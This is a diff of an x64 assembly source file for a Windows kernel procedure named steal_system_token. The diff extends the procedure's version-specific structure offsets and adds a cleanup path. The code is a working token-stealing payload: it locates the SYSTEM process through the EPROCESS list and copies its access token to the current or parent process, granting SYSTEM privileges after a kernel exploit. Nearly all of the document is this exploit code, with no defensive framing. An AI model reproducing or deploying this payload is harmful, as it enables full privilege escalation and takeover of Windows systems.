@@ -9,7 +9,7 @@
 ;
 ; Modifications:
 ;  11/01/2022	Created
-;  19/01/2022	Updated
+;  04/01/2023	Updated
 ; ------------------------------------------------------------------------
 
 ; Start of .text segment
@@ -22,6 +22,10 @@ ALIGN 16
 steal_system_token PROC PUBLIC
 	; Initialize RAX register to 0
 	xor eax, eax                       ; clear RAX
+
+	; Resolve required offset for Windows 8/Windows Server 2012/Windows 8.1/Windows Server 2012 R2/Windows 10/Windows 11/Windows Server 2016/Windows Server 2019/Windows Server 2022
+	; WinDbg command: ? @@c++(#FIELD_OFFSET(nt!_KTHREAD, Process))
+	mov r11, 220h                      ; R11 = FIELD_OFFSET(nt!_KTHREAD, Process)
 
 	; Get major/minor version number to determine OS version
 	; nt!_KUSER_SHARED_DATA structure is located at fixed VA of 0xFFFFF78000000000
@@ -39,14 +43,15 @@ steal_system_token PROC PUBLIC
 	cmp eax, 10d                       ; if (EAX == 10) => Windows 10/Windows 11/Windows Server 2016/Windows Server 2019/Windows Server 2022, set EFLAGS.ZF!
 	jz win10                           ; jump if EFLAGS.ZF == 1 to win10 label
 	mov eax, 0C0000001h                ; else OS version must be unsupported so we set RAX to STATUS_UNSUCCESSFUL(0xC0000001)
-	ret                                ; return from procedure
+	jmp cleanup                        ; jump unconditionally to cleanup label to perform cleanup and return from procedure
 
-	; Resolve required offsets for Windows 7/Windows Server 2008 R2
+	; Resolve and update required offsets for Windows 7/Windows Server 2008 R2
 	; WinDbg command: ? @@c++(#FIELD_OFFSET(nt!_EPROCESS, ActiveProcessLinks))
 	; WinDbg command: ? @@c++(#FIELD_OFFSET(nt!_EPROCESS, Token))
 win7:
 	mov r9, 188h                       ; R9 = FIELD_OFFSET(nt!_EPROCESS, ActiveProcessLinks)
 	mov r10, 208h                      ; R10 = FIELD_OFFSET(nt!_EPROCESS, Token)
+	mov r11, 210h                      ; R11 = FIELD_OFFSET(nt!_KTHREAD, Process)
 	jmp offsets_resolved               ; jump unconditionally to offsets_resolved label to prevent fallthrough
 
 	; Resolve required offsets for Windows 8/Windows Server 2012/Windows 8.1/Windows Server 2012 R2
@@ -86,7 +91,7 @@ win10:
 	cmp eax, 19044d                    ; if (EAX == 19044) => Windows 10 2110/21H2, set EFLAGS.ZF!
 	jz win10_20h1_20h2_21h1_21h2       ; jump if EFLAGS.ZF == 1 to win10_20h1_20h2_21h1_21h2 label
 	mov eax, 0C0000001h                ; else OS version must be unsupported so we set RAX to STATUS_UNSUCCESSFUL(0xC0000001)
-	ret                                ; return from procedure
+	jmp cleanup                        ; jump unconditionally to cleanup label to perform cleanup and return from procedure
 
 	; Resolve required offsets for Windows 10 TS1/Windows 10 TS2/Windows 10 RS1
 win10_ts1_ts2_rs1:
@@ -121,9 +126,9 @@ offsets_resolved:
 	mov rax, qword ptr gs:[188h]       ; RAX = *(gsbase + 0x188) = current nt!_KTHREAD VA
 
 	; Get pointer to current process object that houses the currently executing thread(nt!_KPROCESS structure)
-	; At an offset of 0x220 into nt!_KTHREAD structure lies Process field(nt!_KPROCESS structure VA)
+	; At an offset of 0xXXX(dynamic) into nt!_KTHREAD structure lies Process field(nt!_KPROCESS structure VA)
 	; WinDbg command: uf nt!IoThreadToProcess
-	mov rax, qword ptr [rax + 220h]    ; RAX = nt!_KTHREAD.Process = current nt!_KPROCESS VA
+	mov rax, qword ptr [rax + r11]     ; RAX = nt!_KTHREAD.Process = current nt!_KPROCESS VA
 
 	; Save pointer to current executive process object(nt!_EPROCESS structure) from RAX register to RCX register
 	; At an offset of 0x0 into nt!_EPROCESS structure lies Pcb field(nt!_KPROCESS structure)
@@ -154,7 +159,7 @@ search_system_process:
 	
 	; [DBG]
 	; Uncomment to grant SYSTEM token to parent process instead of current process, uses hard-coded dynamic offset, only for testing purposes!
-	;mov r8, qword ptr [rcx + 540h]
+	;mov r8, qword ptr [rcx + 290h]
 	;add rcx, r9
 ;search_parent_process:
 	;mov rcx, qword ptr [rcx]
@@ -179,6 +184,9 @@ search_system_process:
 
 	; Return success status to calling procedure
 	xor eax, eax                       ; clear RAX, set RAX to STATUS_SUCCESS(0x00000000)
+	
+	; Cleanup
+cleanup:
 	ret                                ; return from procedure
 steal_system_token ENDP
 
